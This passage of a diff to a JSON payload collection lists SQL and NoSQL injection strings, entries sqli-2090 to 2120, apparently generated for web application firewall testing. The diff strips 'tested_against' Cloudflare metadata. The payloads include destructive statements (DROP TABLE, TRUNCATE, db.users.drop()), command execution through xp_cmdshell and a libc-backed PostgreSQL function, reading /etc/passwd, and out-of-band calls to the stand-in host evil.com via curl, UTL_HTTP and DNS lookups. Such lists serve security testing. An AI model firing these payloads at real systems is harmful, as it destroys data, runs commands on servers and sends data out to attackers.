       "payload": "' AND RIGHT(version(),1)='1'--",
       "description": "RIGHT comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2091",
@@ -1270,12 +820,7 @@
       "payload": "' AND CHAR(65)='A'--",
       "description": "CHAR comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2092",
@@ -1284,12 +829,7 @@
       "payload": "' AND ORD(MID(version(),1,1))>50--",
       "description": "ORD comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2093",
@@ -1298,12 +838,7 @@
       "payload": "' AND BIT_LENGTH(database())>40--",
       "description": "BIT_LENGTH comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2094",
@@ -1312,12 +847,7 @@
       "payload": "' AND LOCATE('5',version())=1--",
       "description": "LOCATE comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2095",
@@ -1326,12 +856,7 @@
       "payload": "' AND POSITION('5' IN version())=1--",
       "description": "POSITION comparison",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2096",
@@ -1340,12 +865,7 @@
       "payload": "'; DROP TABLE users--",
       "description": "DROP TABLE",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2097",
@@ -1354,12 +874,7 @@
       "payload": "'; DELETE FROM users--",
       "description": "DELETE FROM",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2098",
@@ -1368,12 +883,7 @@
       "payload": "'; UPDATE users SET password='hacked'--",
       "description": "UPDATE",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2099",
@@ -1382,12 +892,7 @@
       "payload": "'; INSERT INTO users VALUES('hacker','pass')--",
       "description": "INSERT INTO",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2100",
@@ -1396,12 +901,7 @@
       "payload": "'; CREATE TABLE hacked(id int)--",
       "description": "CREATE TABLE",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2101",
@@ -1410,12 +910,7 @@
       "payload": "'; ALTER TABLE users ADD COLUMN hacked int--",
       "description": "ALTER TABLE",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2102",
@@ -1424,12 +919,7 @@
       "payload": "'; TRUNCATE TABLE users--",
       "description": "TRUNCATE",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2103",
@@ -1438,12 +928,7 @@
       "payload": "'; EXEC xp_cmdshell('whoami')--",
       "description": "MSSQL xp_cmdshell",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2104",
@@ -1452,12 +937,7 @@
       "payload": "'; EXEC sp_configure 'show advanced options',1--",
       "description": "MSSQL sp_configure",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2105",
@@ -1466,12 +946,7 @@
       "payload": "'; DECLARE @cmd varchar(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd--",
       "description": "MSSQL DECLARE EXEC",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2106",
@@ -1480,12 +955,7 @@
       "payload": "'; COPY (SELECT '') TO PROGRAM 'curl http://evil.com'--",
       "description": "PostgreSQL COPY PROGRAM",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2107",
@@ -1494,12 +964,7 @@
       "payload": "'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT--",
       "description": "PostgreSQL UDF",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2108",
@@ -1508,12 +973,7 @@
       "payload": "' AND 1=CAST((SELECT version()) AS numeric)--",
       "description": "PostgreSQL CAST error",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2109",
@@ -1522,12 +982,7 @@
       "payload": "'; SELECT pg_read_file('/etc/passwd')--",
       "description": "PostgreSQL pg_read_file",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2110",
@@ -1536,12 +991,7 @@
       "payload": "'; SELECT pg_ls_dir('/etc')--",
       "description": "PostgreSQL pg_ls_dir",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2111",
@@ -1550,12 +1000,7 @@
       "payload": "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('evil.com')--",
       "description": "Oracle DNS exfil",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2112",
@@ -1564,12 +1009,7 @@
       "payload": "' AND 1=UTL_HTTP.REQUEST('http://evil.com')--",
       "description": "Oracle HTTP request",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2113",
@@ -1578,12 +1018,7 @@
       "payload": "' AND 1=DBMS_LDAP.INIT('evil.com',389)--",
       "description": "Oracle LDAP",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2114",
@@ -1592,12 +1027,7 @@
       "payload": "' UNION SELECT NULL FROM dual--",
       "description": "Oracle dual",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2115",
@@ -1606,12 +1036,7 @@
       "payload": "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
       "description": "Oracle CTXSYS",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2116",
@@ -1620,12 +1045,7 @@
       "payload": "' || '1'=='1",
       "description": "NoSQL OR",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2117",
@@ -1634,12 +1054,7 @@
       "payload": "'; return true; var x='",
       "description": "NoSQL JavaScript",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2118",
@@ -1648,12 +1063,7 @@
       "payload": "' || this.password.match(/.*/)//",
       "description": "NoSQL regex",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2119",
@@ -1662,12 +1072,7 @@
       "payload": "' || '1'=='1' || '",
       "description": "NoSQL double OR",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "sqli-2120",
@@ -1676,12 +1081,7 @@
       "payload": "'; db.users.drop(); var x='",
       "description": "NoSQL drop collection",
       "technique": "sql_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     }
   ]
 }
